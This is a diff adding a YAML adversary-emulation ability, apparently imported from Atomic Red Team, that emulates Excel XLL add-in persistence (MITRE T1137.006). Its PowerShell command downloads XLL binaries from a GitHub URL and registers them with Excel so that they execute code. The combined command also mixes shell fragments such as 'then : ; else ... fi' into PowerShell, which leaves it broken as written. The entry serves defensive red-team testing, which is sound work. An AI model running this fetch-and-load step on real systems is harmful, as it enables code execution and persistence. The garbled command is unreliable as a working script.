@@ -1,0 +1,67 @@
+- id: 441b1a0f-a771-428a-8af0-e99e4698cda3
+  name: Code Executed Via Excel Add-in File (XLL)
+  description: 'Loads an XLL file using the excel add-ins library.
+
+    This causes excel to launch Notepad.exe as a child process. This atomic test does
+    not include persistent code execution as you would typically see when this is
+    implemented in malware.'
+  tactic: persistence
+  technique:
+    attack_id: T1137.006
+    name: 'Office Application Startup: Add-ins'
+  platforms:
+    windows:
+      psh:
+        command: 'try {; New-Object -COMObject "Excel.Application" | Out-Null; Stop-Process
+          -Name "Excel"; exit 0; } catch { exit 1 }; then : ; else Write-Host "You
+          will need to install Microsoft Excel manually to meet this requirement";
+          fi; if ((Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll")
+          -and (Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"))
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\T1137.006\bin\Addins\"
+          -Force | Out-Null; Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll"
+          -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll";
+          Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll"
+          -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll";
+          fi; $excelApp = New-Object -COMObject "Excel.Application"; if(-not $excelApp.path.contains("Program
+          Files (x86)")){; Write-Host "64-bit Office"; $excelApp.RegisterXLL("PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll");
+          }; else{; Write-Host "32-bit Office"; $excelApp.RegisterXLL("PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll");
+          }'
+        cleanup: Stop-Process -Name "notepad","Excel" -ErrorAction Ignore
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - persistence
+  - t1137.006
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    dependencies:
+    - description: 'Microsoft Excel must be installed
+
+        '
+      prereq_command: "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n\
+        \  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n"
+      get_prereq_command: 'Write-Host "You will need to install Microsoft Excel manually
+        to meet this requirement"
+
+        '
+    - description: XLL files must exist on disk at specified location
+      prereq_command: 'if ((Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll")
+        -and (Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"))
+        {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\T1137.006\bin\Addins\"
+        -Force | Out-Null
+
+        Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll"
+        -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"
+
+        Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll"
+        -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"'
+    technique_created: '2019-11-07T19:52:52.801Z'
+    atomic_guid: 441b1a0f-a771-428a-8af0-e99e4698cda3
+    import_timestamp: '2025-06-24T11:15:03.704977Z'
